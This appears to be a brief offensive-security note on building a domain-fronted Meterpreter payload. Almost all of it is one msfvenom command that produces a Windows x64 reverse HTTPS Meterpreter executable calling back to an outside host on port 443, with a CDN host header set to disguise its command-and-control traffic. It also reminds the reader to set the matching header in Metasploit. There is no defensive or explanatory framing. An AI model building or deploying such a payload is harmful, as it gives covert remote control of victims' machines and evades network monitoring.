# Create df payload
dont forget to set HttpHostHeader offensive-security.azureedge.net in metasploit
```
msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
```
